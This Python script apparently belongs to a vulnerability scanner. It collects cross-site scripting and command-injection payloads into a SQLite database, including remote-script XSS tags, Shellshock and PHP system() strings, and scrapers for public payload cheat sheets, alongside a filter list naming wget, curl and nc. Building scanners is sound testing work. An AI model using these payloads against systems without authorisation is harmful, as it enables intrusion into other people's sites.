import requests
from bs4 import BeautifulSoup
import unicodedata
from Payloads import Payloads
from sqlmodel import Session, SQLModel, create_engine
from src.DBManager.IDBManager import Modes
from os.path import realpath, dirname, join


# sqli_payload_set = set()
# sqli_payloads_links = [
#     r"https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder",
# ]

def normal_xss_payloads() -> set[str]:
    """
    @return: hardcoded list of cherry-picked payloads
    """
    return {
        r"<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        r"<IMG SRC=\"javascript:alert('XSS');\">",
        r"<IMG SRC=javascript:alert('XSS')>",
        r"<IMG SRC=JaVaScRiPt:alert('XSS')>",
        r"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
        r'<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'
        r'<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
        r'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        r'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116'
        r';&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
        r'<IMG SRC="jav	ascript:alert(\'XSS\');">',
        r'<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
        r'<IMG SRC="`<javascript:alert>`(\'XSS\')"',
    }


def normal_ci_payloads() -> set[str]:
    """
    @return: hardcoded list of cherry-picked payloads
    """
    return {
        r"echo hello",
        r"sleep 10",
        r"ls %0A id",
        r"ls %0A sleep 10",
        r"`sleep 10`",
        r"`echo hi`",
        r"$(ls)",
        r"$(sleep 10)",
        r"& ping -i 30 127.0.0.1 &",
        r'() { :;}; /bin/bash -c "sleep 10 && echo vulnerable 10"',
        r"eval('sleep 10')",
        r"&& sleep 10",
        r"|| sleep 10",
        r"{${sleep(10)}}",
        r"& system('sleep 10');",
        r"& sleep 10;",
        r";echo '<script>alert(1)</script>'",
        r'<?php system("sleep 10");?>'
    }


def filter_ci_payloads(old_list: set[str]) -> set[str]:
    """
    Filtering CI Payloads
    @param old_list: unfiltered payloads
    @return: filtered payloads
    """
    things_we_dont_need = [
        "id",
        "wget",
        "curl",
        "dir",
        "ip",
        "ifconfig",
        "nc",
        "perl"
        "whoami",
        "name",
        "net",
        "sleep 1",
        "sleep 3",
        "sleep 5",
        "sleep 6"
    ]
    new_payloads = set()
    for payload in old_list:
        good = True
        for unnecessary in things_we_dont_need:
            if unnecessary in payload or not payload:
                good = False
                break

        if good:
            new_payloads.add(payload)

    return new_payloads


def scrape_aggressive_xss() -> set[str]:
    """
    Scrapes and parses a variety of XSS payloads
    @return: a set of XSS payloads
    """
    xss_normal_link = r"https://xn4k.github.io/pentest/bug%20bounty/ethical%20hacking/XSS-Filter-Evasion-Cheat-Sheet/"
    res = requests.get(xss_normal_link)
    bs = BeautifulSoup(res.text, "html.parser")
    print(normal_xss := set(
        [unicodedata.normalize("NFKC", elem.get_text().rstrip('\n')) for elem in bs.find_all('code')][1:]))
    return normal_xss


def scrape_aggressive_ci() -> set[str]:
    """
    Scrapes and parses a variety of CI payloads
    @return: a set of CI payloads
    """
    ci_normal_link = r"https://hackersonlineclub.com/command-injection-cheatsheet/"
    res = requests.get(ci_normal_link)
    bs = BeautifulSoup(res.text, "html.parser")

    all_payloads = [unicodedata.normalize("NFKC", elem.get_text()) for elem in bs.find_all('pre')]
    normal_ci = set()
    for payload in all_payloads:
        normal_ci.update(payload.split("\r\n"))
    return normal_ci


def write_to_db(vuln: str, payloads: set[str], mode: int) -> None:
    """
    Writes a list of payloads to the database
    @param payloads: list of payloads to write
    @param mode: mode to write payloads in
    @param vuln: the vulnerability type
    @return: None
    """
    sqlite_file_name = r"../payloads.sqlite"
    sqlite_url = f"sqlite:///{sqlite_file_name}"
    engine = create_engine(sqlite_url, echo=True)

    SQLModel.metadata.create_all(engine)

    with Session(engine) as session:
        for payload in payloads:
            converted_payload = Payloads(vulnerability=vuln, payload=payload, mode=mode)
            session.add(converted_payload)
        session.commit()


def workflow() -> None:
    """
    Describes the workflow
    @return: None
    """
    path = dirname(realpath(__file__))  # getting file path
    with open(join(path, "../payloads.sqlite"), "w"):   # resetting DB
        write_to_db("CI", normal_ci_payloads(), Modes.NORMAL.value)     # writing all vulns to db
        write_to_db("CI", filter_ci_payloads(scrape_aggressive_ci()), Modes.AGGRESSIVE.value)
        write_to_db("XSS", normal_xss_payloads(), Modes.NORMAL.value)
        write_to_db("XSS", scrape_aggressive_xss(), Modes.AGGRESSIVE.value)


workflow()
